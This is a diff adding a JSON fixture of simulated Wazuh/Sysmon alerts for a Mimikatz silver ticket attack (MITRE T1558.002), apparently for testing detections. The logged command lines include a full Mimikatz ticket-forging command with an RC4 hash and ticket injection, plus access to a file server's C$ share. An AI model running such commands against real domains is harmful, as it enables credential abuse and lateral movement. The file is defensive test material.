@@ -1,0 +1,157 @@
+{
+  "_metadata": {
+    "attack_id": "T1558.002",
+    "variation": "001",
+    "name": "Silver Ticket via Mimikatz",
+    "description": "Forge Kerberos service ticket using compromised service account NTLM hash",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "credential-access",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Process Creation: Mimikatz silver ticket for CIFS service",
+      "sequence": 1,
+      "timestamp": "2026-02-22T10:18:00.000Z",
+      "log": {
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1558.002"
+            ],
+            "tactic": [
+              "Credential Access"
+            ],
+            "technique": [
+              "Steal or Forge Kerberos Tickets: Silver Ticket"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709002400.000042",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-22 10:18:00.000",
+              "processGuid": "{12345678-2400-2400-2400-000000000042}",
+              "processId": "22100",
+              "image": "C:\\Users\\Public\\mimikatz.exe",
+              "commandLine": "mimikatz.exe \"kerberos::golden /domain:corp.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:FS01.corp.local /service:cifs /rc4:a3f0b2c1d4e5f6a7b8c9d0e1f2a3b4c5 /user:Administrator /ptt\" exit",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "hashes": "SHA256=E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6",
+              "parentProcessGuid": "{12345678-2400-2400-2400-000000000000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Process Creation: Access target with forged ticket",
+      "sequence": 2,
+      "timestamp": "2026-02-22T10:18:10.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1558.002"
+            ],
+            "tactic": [
+              "Credential Access",
+              "Lateral Movement"
+            ],
+            "technique": [
+              "Steal or Forge Kerberos Tickets: Silver Ticket"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709002400.000043",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-22 10:18:10.000",
+              "processGuid": "{12345678-2400-2400-2400-000000000043}",
+              "processId": "22200",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "cmd.exe /c dir \\\\FS01.corp.local\\C$",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "hashes": "SHA256=C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4",
+              "parentProcessGuid": "{12345678-2400-2400-2400-000000000000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
